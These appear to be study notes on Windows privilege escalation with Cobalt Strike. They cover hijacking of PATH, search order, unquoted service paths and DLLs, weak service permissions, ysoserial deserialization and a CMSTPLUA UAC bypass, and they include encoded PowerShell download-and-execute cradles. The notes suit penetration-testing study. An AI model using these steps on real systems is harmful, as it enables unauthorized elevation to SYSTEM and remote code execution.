There are three main account groups which are relevant to privilege escalation.
	Users
	Administrators
	Service User Accounts
		_LocalService_ -- minimum priv on local computer. Authenticates on network with anonymous credentials
		_NetworkService_ -- minimum priv on local computer. Authenticates on the network by presenting computer's credentials
		_LocalSystem_ -- **SYSTEM**

User Rights Assignment - Fine-grained control over account privilege
	Logon Rights
		How and where an account is authorized to log into a computer
	User Rights
		Control access to objects

```powershell
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit 
```
## Path Interception
Path interception is a class of vulnerability that occurs when an adversary is able to drop an executable into a location where it will get executed before the intended one
#### PATH Environment Variable
Each env variable, including PATH, can be seen using `env`
```powershell
beacon> env
```

PATH is constructed from 2 locations (Machine + User paths)
	User : `HKEY_CURRENT_USER\Environment`
	Machine : `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment`

Some software installs its path to system root and adds to the PATH variable BEFORE default paths. BAD NEWS !!!

We can relatively reference .exe commands (like timeout.exe) which live in `C:\Windows\System32\*.exe`, and upload malicious "duplicates" to vulnerable paths. The vulnerable path will be searched before the default location (System32)

NOTE: cmd.exe doesnt work with this because underlying APIs used to run processes can follow different search orders (see Search Order Hijacking)

Exploit
```powershell
# Enumerate PATH directories, identify potential targets that proceed System32, for example
beacon> env    

# Verify we can modify directory
beacon> cacls [path]  # identify perms of file/directory

# Upload payload
beacon> cd C:\Vulnerable\path
beacon> upload C:\payload.exe        # remember OPSEC... name it good
beacon> mv payload.exe timeout.exe   # timeout.exe is an example...

# Run timeout
beacon> shell timeout
```
![[Pasted image 20251223151326.png]]
#### Search Order Hijacking
The underlying APIs used to run processes can follow different search orders.  Path interception by search order hijacking occurs when an attacker can hijack this search order.

[WinExec](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec) API follows the following search order:
- The executing directory (where the app LIVES)
- The current working directory.
- The System32 directory.
- The 16-bit System directory.
- The Windows directory.
- Directories in the PATH environment variable.

By default, all SERVICES start with their current working directory set to `C:\Windows\System32` , hence cmd.exe could not be hijacked with PATH var above.

The CreateProcess API can vary: 
	If `lpApplicationName` is present:
		Searches current working directory only. SECURE.
	if `lpApplicationName` is not present but `lpCommandLine` is present:
		Follows WinExec API search order. NOT SECURE.

Hijacking cmd.exe would be possible if an adversary has write access to a directory that proceeds the current working directory

Example Search Order Hijacking
```powershell
# Identify we have perms over executing directory
beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable"

# Upload payload and catch SYSTEM beacon
beacon> cd C:\Program Files\Bad Windows Service\Service Executable
beacon> upload C:\Payloads\dns_x64.exe      # remember OPSEC...
beacon> mv dns_x64.exe cmd.exe       
```
![[Pasted image 20251223151318.png]]

#### Unquoted Paths
CreateProcess exhibits more interesting behavior when the `lpCommandLine` parameter contains spaces _and not_ encapsulated by a set of quotations. Does not follow search order but interprets path based on white spaces. See [[Master Checklist (OLD)]] to recall

Example of Unquoted Path Search Order
```powershell
C:\Program Files\Bad Application\Bad Program.exe

C:\Program
C:\Program.exe
C:\Program Files\Bad
C:\Program Files\Bad.exe
C:\Program Files\Bad Application\Bad
C:\Program Files\Bad Application\Bad.exe
C:\Program Files\Bad Application\Bad Program.exe
C:\Program Files\Bad Application\Bad Program.exe.exe
```

Path interception by unquoted path can be exploited if an adversary can write a malicious program in one of these interpreted paths

Exploiting Unquoted Paths
```powershell
# Enumerate Services for unquoted paths
beacon> sc_enum
	# EXAMPLE: C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe
beacon> sc_qc BadWindowsService

# Enumerate privileges over interpreted paths
beacon> cacls "C:\Program Files\Bad Windows Service" # Try for ALL paths

# Upload payload and catch SYSTEM beacon
beacon> cd C:\Program Files\Bad Windows Service
beacon> upload C:\Payloads\dns_x64.svc.exe      # REMEMBER OPSEC
beacon> mv dns_x64.svc.exe Service.exe       # this name is because Service.exe follows \BadWindowsService\ ... See Example above for reference

# Restart Services
beacon> sc_stop BadWindowsService # If we have perms to start/stop services
beacon> sc_start BadWindowsService

# Cleanup
beacon> rm Service.exe

Wait for computer to restart # If we dont have perms to start/stop services
```
![[Pasted image 20251223152705.png]]

## Weak Service Permissions
Mistakes can be made in the installation process for a service which can grant weak permissions, leading to elevation of privilege vulnerabilities.
#### Service File Permissions
The binary that a service runs may have a weak ACE applied that allows standard users to modify it

NOTE: This is a destructive action because you're completely overwriting the service binary with your payload.

Exploiting Weak Service File Permissions
```powershell
# Enumerate Services
beacon> sc_enum

# Identify Service Perms
beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe"
	#C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe NT AUTHORITY\Authenticated Users:F

# Alter and restart
beacon> cd C:\Program Files\Bad Windows Service\Service Executable\
beacon> sc_stop BadWindowsService
beacon> upload C:\Payloads\BadWindowsService.exe
beacon> sc_start BadWindowsService
```

#### Service Registry Permissions
When a new service is installed, an entry is written into the registry at `HKLM\SYSTEM\CurrentControlSet\Services`.

If a weak ACE is granted on the service's registry key during installation, we can modify.

Exploiting Service Registry Permissions
```powershell
# Enumerate Services
beacon> sc_enum

# Verify the permissions of the service's regsitry key.
beacon> powerpick Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService | fl # Use psinject for OPSEC instead...
	# IF we see FullControl we can pwn it

# Modify binary path and restart service
beacon> sc_stop BadWindowsService
beacon> cd C:\path\to\somewhere\else   # change Beacon CWD
beacon> upload C:\Payloads\dns_x64.exe # upload payload
beacon> sc_qc BadWindowsService        # Make note of binary path
beacon> sc_config BadWindowsService C:\Path\to\Payload.exe 0 2
beacon> sc_start BadWindowsService

# Restore binary path (after beacon has checked in)
beacon> sc_config BadWindowsService C:\original\binary\path 0 2
beacon> rm <payload.exe>
```

## DLL Search Order Hijacking
When referencing a DLL, it's atypical to provide its full path because it cannot be reliably known ahead of time. Windows becomes responsible for finding its location on disk.  This is called the [DLL search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order).

DLL Search Order
	The executing directory.
	The System32 directory.
	The 16-bit System directory.
	The Windows directory.
	The current working directory of the program.
	Directories in the PATH environment variable.

DLL search order hijacking is dropping a malicious module of the same name ion a directory that is higher in the search hierarchy.

DLL Search Order Hijacking - example
```powershell
# Checking if DLL is in same directory as service executable
beacon> ls C:\Program Files\Bad Windows Service\Service Executable
	# Nope!!!

# Determine where the DLL lives...
beacon> env  # just a start, might live in other places

# Check perms of directory
beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable"

# Write to it (in this case we got it in the executing directory)
beacon> cd C:\Program Files\Bad Windows Service\Service Executable
beacon> upload C:\Payloads\dns_x64.dll    # REMEMBER OPSEC...
beacon> mv dns_x64.dll BadDll.dll
```
![[Pasted image 20251223164351.png]]
## Software Vulnerabilities

#### Unsafe Deserialization
When such software is running in an elevated context, exploitation from a user context may result in an elevation of privilege.

Software applications may be exploitable via traditional vulnerabilities such as buffer overflows, format strings, directory traversal, SQL or command injection, and deserialization of untrusted data.  

EXAMPLE APPLICATION THAT WE CAN ABUSE
![[Pasted image 20251223165419.png]]
We could abuse this by writing a malicious blob to `C:\Temp\data.bin` which when deserialized will execute.

[ysoserial.net](https://github.com/pwntester/ysoserial.net) is an amazing tool for creating .NET gadgets for this purpose

```powershell
#generate powershell oneliner
Right-click beacon > Access > One-Liner > pick payload

# Serialize
C:\Users\Attacker>C:\Tools\ysoserial.net\ysoserial\bin\Release\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -nop -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAzADEANAA5ADAALwAnACkA" -o raw --outputpath=C:\Payloads\data.bin

# Upload file to target (to location specified in app)
beacon> cd C:\Temp
beacon> upload C:\Payloads\data.bin

# Check and start service if necessary
beacon> sc_query BadWindowsService
beacon> sc_start BadWindowsService

# Cleanup
beacon> rm data.bin
```



## User Account Control (UAC)
Windows provides a mechanism called Mandatory Integrity Control (MIC) that helps control access to securable objects, such as processes and files.

4 Levels of MIC
	A security principal cannot modify an object that is assigned with a higher integrity level than their own.
	low
	medium
	high
	system

For example, a local admin only has medium integrity by default. Even though a local admin, cmd.exe is medium integrity.
![[Pasted image 20251223170159.png]]

User Account Control (UAC) is a defense-in-depth feature of Windows that acts as a gatekeeper to MIC. To perform an administrative action such as the one above, an administrator user must specifically request to launch cmd.exe in an elevated context (High Integrity). UAC provides a prompt for consent.
	![[Pasted image 20251223170435.png]]
	![[Pasted image 20251223170438.png]]

#### Elevators & Exploits
Cobalt Strike provides two built-in primitives for executing code in a high-integrity context, which it calls 'elevators' and 'exploits'
	_Elevator_ : Runs any command ( w/ arguments) via `runasadmin` command
	_Exploit_ : Spawns a new Beacon session via `elevate` command

Using Elevators and Exploits
```powershell
beacon> runasadmin                             # show available elevators
beacon> runasadmin [exploit] [command] [args]  # run an elevator

beacon> elevate                       # show available exploits
beacon> elevate [exploit] [listener]  # run exploit
```

#### CMSTPLUA UAC Bypass
Requirements:
	Process our Beacon lives in must be in `C:\Windows*`

OPSEC Note
	Supposedly this is not a BOF so use with caution?

NOTE:
	if we can run powershell as admin, we can just do that then powershell -ep bypass -nop a payload we uploaded in windows\temp...
```powershell
# spawn new beacon
beacon> spawn x64 http  # by default, this spawns rundll32.exe (BAD OPSEC)
	# By adjusting Malleable C2 profile, this should be fine... can manually adjust with ak if needed

# Interact with new beacon

# generate powershell one-liner of new beacon
Right Click > Access > One-liner > tcp-local listener

# bypass uac and run rev-shell cmd...
beacon> runasadmin uac-cmstplua powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADgAMQA2ADIALwAnACkA

# connect to elevated beacon
beacon> connect localhost 1337
```